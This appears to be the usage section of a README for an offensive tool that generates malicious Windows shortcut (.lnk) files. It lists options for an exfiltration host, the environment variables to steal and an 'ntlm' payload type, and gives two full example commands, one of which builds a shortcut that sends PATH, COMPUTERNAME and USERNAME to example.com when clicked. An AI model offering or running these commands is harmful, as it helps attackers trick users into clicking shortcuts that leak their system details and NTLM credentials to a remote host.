# Usage

## Command Line Options

- `--lang`: Choose language: en, ru, zh
- `--host`: Where should we send our data?
- `--output`: The name of the lnk file
- `--execute`: Command to execute when the shortcut is clicked (default: `C:\Windows\explorer.exe .`)
- `--vars`: Variables to exfiltrate, e.g., "PATH,COMPUTERNAME,USERNAME,NUMBER_OF_PROCESSORS"
- `--type`: Payload type to generate (choices: `environment`, `ntlm`, `all`)

## Examples

1. Generate a shortcut that opens Notepad:
    ```bash
    python lnk_payload_generator.py --lang en --host example.com --output notepad.lnk --execute "notepad.exe"
    ```

2. Generate a shortcut that exfiltrates environment variables:
    ```bash
    python lnk_payload_generator.py --lang en --host example.com --output payload.lnk --vars "PATH,COMPUTERNAME,USERNAME" --type environment
    ```

